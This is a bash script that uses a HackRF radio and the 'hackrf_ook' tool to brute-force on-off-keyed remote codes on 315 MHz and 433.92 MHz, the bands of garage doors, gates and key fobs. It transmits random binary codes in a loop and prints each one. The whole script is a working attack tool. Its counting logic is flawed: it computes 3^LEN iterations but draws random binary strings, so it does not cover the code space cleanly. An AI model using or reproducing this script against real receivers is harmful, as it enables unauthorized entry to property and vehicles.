#!/bin/bash

# How To: ./Script <repeatX> <Len 25>

FREQS=(315000000 314900000 433920000)
REPEAT=$1
LEN=$2

# calculates the total number of combinations based on the length specified in the argument LEN. This is used to control the while loop, so that it runs the correct number of times.
NUM_COMBINATIONS=$((3**$LEN)) 
COUNTER=0

while [ $COUNTER -lt $NUM_COMBINATIONS ]
do
   CODE=""
   for ((i=0; i<$LEN; i++))
   do
      rand=$(( RANDOM % 2 ))
      CODE="$CODE$rand"
   done

   for FREQ in "${FREQS[@]}" 
   do
       IFERQ=$FREQ

# Add randomness $(shuf -i 1000-9600 -n 1) ie. hackrf_ook -b $(shuf -i 1000-9600 -n 1)   

#Hackrf_ook is system wide in this set up if you do not then put in same folder as hackrf_ook and add #./hackrf_ook

   hackrf_ook -r $REPEAT -s 6156 -b 755 -p 3400 -0 260 -1 512 -m $CODE -f $IFERQ -g -n
   echo -e "\e[42m\e[30mBit String: $CODE\e[0m"
done

   echo -e "\e[31mCounter is currently on: $COUNTER\e[0m"
   COUNTER=$((COUNTER+1))
   if [ $COUNTER -eq $NUM_COMBINATIONS ]
   then
        break
   fi
done